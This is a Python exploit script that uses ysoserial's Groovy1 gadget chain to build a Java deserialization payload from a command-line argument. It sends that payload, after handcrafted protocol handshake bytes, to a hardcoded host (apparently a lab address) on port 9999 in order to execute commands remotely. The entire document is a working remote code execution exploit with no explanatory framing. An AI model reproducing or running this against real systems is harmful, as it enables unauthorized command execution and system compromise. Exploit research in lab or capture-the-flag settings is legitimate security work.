#!/usr/bin/env python3

from subprocess import Popen, PIPE

import socket
import sys

command = sys.argv[1]

def main(command):

    pkt0 = b"\xac\xed\x00\x05"
    pkt1 = b"\x77\x04"
    pkt2 = b"\xf0\x00\xba\xaa"

    client_hello = pkt0 + pkt1 + pkt2

    client_version = b"\x77\x02\x01\x01"

    client_name = b"\x77\x09"
    client_name += b"\x00\x05\x68\x65\x6c\x6c\x6f"

    p = Popen(['java', '-jar', '/opt/ysoserial/ysoserial-master-SNAPSHOT.jar','Groovy1', '{}'.format(command)], stdin=PIPE, stdout=PIPE, stderr=PIPE)
    payload, error = p.communicate()

    serialize_hash_request = payload[4:]

    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.195.133", 9999))
        print("[+] Sending client hello")
        s.send(client_hello)
        print("[+] Respond to client version")
        s.send(client_version)
        print("[+] Respond to client name request")
        s.send(client_name)
        print("[+] Generating ysoserial payload for: {}".format(command))
        s.send(serialize_hash_request)
        print("[+] Sent payload for deserialization")
        print(s.recv(256))
        s.close()

    except socket.error as e:

        print(repr(e))

main(command)